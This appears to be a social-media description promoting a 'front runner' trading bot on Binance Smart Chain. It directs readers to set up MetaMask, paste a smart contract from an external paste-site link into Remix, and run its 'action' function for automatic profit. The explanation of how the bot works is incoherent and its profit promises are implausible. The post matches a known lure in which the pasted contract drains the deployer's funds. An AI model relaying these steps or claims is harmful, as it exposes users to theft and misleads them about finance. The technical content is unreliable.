description: How to acquire MetaMask Wallet: https://metamask.io/download.html  How to connect BSC (Binance Smart Chain) to MetaMask Wallet https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain  Remix Deploying https://remix.ethereum.org/  Copy smart contract to remix: [Last Update 2022.5.5] https://controlc.com/2865a31f  // BSC Pancake Front Runner Front Running 2022 Latest Edition (Binance Smart Chain Cloud Contract, No local downloading required)  The core mechanics of this front runner is that it will front run at the retail investors that come in. In traditional Mempool, miners will prioritize the transaction that provides high Gas Price. For example, if A would like to buy a token with 0.5BNB and B would like to sell the token with 0.6BNB, the transaction between A and B will be concluded within a certain slippery tolerance within Pancake swap liquidity pool.  With the front runner smart contract, it automatically detects the transaction requests from B and buy the tokens with the price of 0.5BNB from B with a higher gas Price so that the transaction gets prioritized by the miners. Then, it sells back the tokens to A with the price of 0.6BNB. The total profit of this front running transaction will be the difference between the bid and ask price (0.1 BNB) minus the higher gas fee, which is typically 0.03-0.05BNB. All happen within the timeframe of 1 minute.  The front runner smart contract only requires executing the “action” function from Remix. It will automatically buy and sell within a minute and then from there it will transit 90% of the profit back to your wallet. The remaining 10% will stay within the front running protocol to keep sniffing out for liquidity arbitrary. //  - Tags: #FrontRunner #FrontRunning #FrontRunningBot #TradingBot #FrontRun #Bot #Binanace #BSC #pancakeswap #BinanceSmartChain #BNB #BinanceSmartChainWallet #AutoTrading #AutoTrader #AutoBot
